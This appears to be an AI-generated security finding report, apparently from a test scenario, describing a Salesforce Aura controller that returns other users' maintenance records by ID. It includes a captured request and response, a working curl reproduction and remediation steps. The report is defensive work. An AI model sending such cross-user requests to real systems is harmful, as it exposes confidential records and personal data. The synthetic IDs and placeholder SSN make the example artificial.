# Security Analysis Report
**System:** WingTech Maintenance Portal (Aerospace / MRO) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0026 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design / Pattern 3.1 | Client-assumed authority — `OpportunityController.getOpportunity` trusts client-supplied `opportunityId`, exposing cross-user MRO maintenance records |

---

## Finding 1 — Client-Assumed Authority: Cross-User MRO Record Access (CRITICAL)

### Summary
The `OpportunityController` Apex class on WingTech Maintenance Portal (`ac6e3fb1.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Opportunity records. Per §5.0 Pattern 3.1, the design assumes the client will only request their own `opportunityId` — there is no server-side enforcement of this assumption. An attacker can supply any `opportunityId` (`0013FB1`) to access another user's MRO maintenance opportunity record, including flight-critical maintenance data and PII.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://ac6e3fb1.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://ac6e3fb1.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DAC6E3FB1!ARac6e3fb1...
message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","params":{"opportunityId":"0013FB1","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{"actions":[{"id":"1;a","state":"SUCCESS","returnValue":{"records":[{"Id":"0013FB1","Name":"Victim Opportunity Record","OwnerId":"005VICTIM","InternalNotes__c":"CONFIDENTIAL: internal review notes","SensitiveData__c":"SSN: 000-44-9602"}]},"error":[]}]}
```

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing check | Root cause |
| §5.0 Pattern 3.1 | Vulnerability | Client-assumed authority | Classification |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Aura action | Entry point |
| HAR params | `opportunityId` | `0013FB1` | Victim MRO record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-44-9602` | MRO technician PII |

### Steps to Reproduce
```bash
SF_TOKEN="00DAC6E3FB1!ARac6e3fb1..."
curl -s -X POST "https://ac6e3fb1.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0013FB1","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# VULNERABLE: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-44-9602
```

### Remediation
1. `public with sharing class OpportunityController {`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist.
4. Validate `aura.token` server-side.
5. Aerospace/MRO: maintenance records are safety-critical; unauthorized access to MRO data can expose maintenance histories and compliance certifications — EASA/FAA regulatory requirements apply.
